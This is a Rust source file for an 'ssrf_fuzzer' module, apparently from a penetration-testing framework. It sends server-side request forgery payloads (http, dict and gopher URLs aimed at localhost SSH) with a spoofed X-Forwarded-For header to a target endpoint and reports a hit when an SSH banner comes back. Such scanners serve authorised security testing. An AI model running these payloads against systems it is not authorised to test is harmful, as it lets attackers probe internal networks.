use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_protocols::{http::HttpSession, NxcSession};
use serde_json::json;
use tracing::info;

pub struct SsrfFuzzer {}

impl SsrfFuzzer {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for SsrfFuzzer {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for SsrfFuzzer {
    fn name(&self) -> &'static str {
        "ssrf_fuzzer"
    }

    fn description(&self) -> &'static str {
        "Tests URL parameters for Server-Side Request Forgery via self-reflection to internal ports."
    }

    fn supported_protocols(&self) -> &[&str] {
        &["http"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "PATH".to_string(),
                description: "Endpoint to test (e.g. /proxy?url=)".to_string(),
                required: true,
                default: None,
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let http_sess = session
            .as_any_mut()
            .downcast_mut::<HttpSession>()
            .ok_or_else(|| anyhow!("Module requires an HTTP session"))?;

        let scheme = if http_sess.use_ssl { "https" } else { "http" };
        let base_path = opts.get("PATH").ok_or_else(|| anyhow!("PATH is required"))?;
        let url = format!("{}://{}:{}{}", scheme, http_sess.target, http_sess.port, base_path);
        
        info!("Starting SSRF Fuzzing (Internal Port Reflection) against {}", url);

        let payloads = vec![
            "http://127.0.0.1:22",
            "http://localhost:22",
            "dict://127.0.0.1:22",
            "gopher://127.0.0.1:22/_SSH", // attempt alternative schemes
            "http://0.0.0.0:22",
        ];

        let mut output = String::from("SSRF Fuzzing Results:\n");
        let mut results = Vec::new();
        let mut ssrf_found = false;

        for payload in payloads {
            let test_url = format!("{}{}", url, payload);
            let mut req = http_sess.client.get(&test_url);
            
            // Note: injecting into X-Forwarded-For etc. usually triggers Blind SSRF,
            // but we are relying on explicit response banners for local SSH check
            req = req.header("X-Forwarded-For", "127.0.0.1");

            if let Some(creds) = &http_sess.credentials {
                if let Some(pw) = &creds.password {
                    req = req.basic_auth(&creds.username, Some(pw));
                } else {
                    req = req.basic_auth(&creds.username, None::<&str>);
                }
            }

            if let Ok(res) = req.send().await {
                if let Ok(body) = res.text().await {
                    let mut found = false;

                    // Standard SSH daemon banners 
                    // e.g. SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
                    if body.contains("SSH-2.0-") || body.contains("Protocol mismatch") {
                        found = true;
                    }

                    if found {
                        ssrf_found = true;
                        output.push_str(&format!("  [!] VULNERABLE to Server-Side Request Forgery!\n"));
                        output.push_str(&format!("      Payload: {}\n", payload));
                        output.push_str(&format!("      Match  : Internal SSH Banner Reflected\n"));
                        
                        results.push(json!({
                            "payload": payload,
                            "match": "SSH Banner"
                        }));
                    }
                }
            }
        }

        if !ssrf_found {
            output.push_str("  [-] No SSRF internal network reflection detected on probed paths.\n");
        }

        Ok(ModuleResult {
            success: ssrf_found,
            output,
            data: json!({ "ssrf_vulnerable": ssrf_found, "matches": results }),
            credentials: vec![],
        })
    }
}
